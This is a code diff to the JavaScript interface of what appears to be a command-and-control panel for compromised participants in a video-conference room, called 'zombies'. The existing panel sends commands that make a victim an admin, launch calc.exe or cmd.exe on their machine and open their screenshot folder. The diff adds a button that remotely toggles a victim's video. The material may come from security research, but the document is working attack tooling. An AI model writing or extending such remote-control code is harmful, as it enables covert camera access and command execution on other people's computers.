@@ -351,9 +351,11 @@ function RoomParticipant(identity, room, userId){
         '                            <input type="text" name="sendChat" class="form-control" placeholder="chat message">\n' +
         '                            <button type="submit" class="btn btn-block btn-primary">Send chat</button>\n' +
         '                        </form>\n' +
-        '                        <div class="dropdown-divider"></div>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
+        '                       <button class="_toggleVideo dropdown-item" type="button">Toggle video</button>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
         '                       <button class="_runCalc dropdown-item" type="button">Run <code>calc.exe</code></button>\n' +
-        '                        <div class="dropdown-divider"></div>\n' +
+        '                       <div class="dropdown-divider"></div>\n' +
         '                       <button class="_runCmd dropdown-item" type="button">Run <code>cmd.exe</code></button>\n' +
         '                       <div class="dropdown-divider"></div>\n' +
         '                       <button class="_openScreenshotDirectory dropdown-item" type="button">Open screenshot directory</button>\n' +
@@ -416,6 +418,9 @@ function RoomParticipant(identity, room, userId){
     });
     cardElement.getElementsByClassName('_setAdmin')[0].addEventListener("click", function (event) {
         sendZombieCmd(that.identity.uuid, 'setMyUserAdmin();');
+    });
+    cardElement.getElementsByClassName('_toggleVideo')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.identity.uuid, "toggleMyVideo();");
     });
     cardElement.getElementsByClassName('_runCalc')[0].addEventListener("click", function (event) {
         sendZombieCmd(that.identity.uuid, "openLink('calc');");
@@ -1207,8 +1212,10 @@ function ZombieControlUI(zombie){
         '                             <button type="submit" class="btn btn-block btn-primary">Redirect UI</button>\n' +
         '                         </form>\n' +
         '                         <div class="dropdown-divider"></div>\n' +
+        '                        <button class="_toggleVideo dropdown-item" type="button">Toggle video</button>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
         '                        <button class="_runCalc dropdown-item" type="button">Run <code>calc.exe</code></button>\n' +
-        '                         <div class="dropdown-divider"></div>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
         '                        <button class="_runCmd dropdown-item" type="button">Run <code>cmd.exe</code></button>\n' +
         '                        <div class="dropdown-divider"></div>\n' +
         '                        <button class="_openScreenshotDirectory dropdown-item" type="button">Open screenshot directory</button>\n' +
@@ -1262,6 +1269,9 @@ function ZombieControlUI(zombie){
         that.controlElement.getElementsByTagName('pre')[0],
     ));
 
+    this.controlElement.getElementsByClassName('_toggleVideo')[0].addEventListener("click", function (event) {
+        sendZombieCmd(that.zombie.uuid, "toggleMyVideo();");
+    });
     this.controlElement.getElementsByClassName('_runCalc')[0].addEventListener("click", function (event) {
         sendZombieCmd(that.zombie.uuid, "openLink('calc');");
     });
@@ -1307,6 +1317,7 @@ function ZombieControlUI(zombie){
         disableElement(this.replFormSubmitElement);
         this.replFormSubmitElement.classList.remove('btn-outline-danger');
 
+        disableElement(this.controlElement.getElementsByClassName('_toggleVideo')[0]);
         disableElement(this.controlElement.getElementsByClassName('_runCalc')[0]);
         disableElement(this.controlElement.getElementsByClassName('_runCmd')[0]);
         disableElement(this.controlElement.getElementsByClassName('_openScreenshotDirectory')[0]);
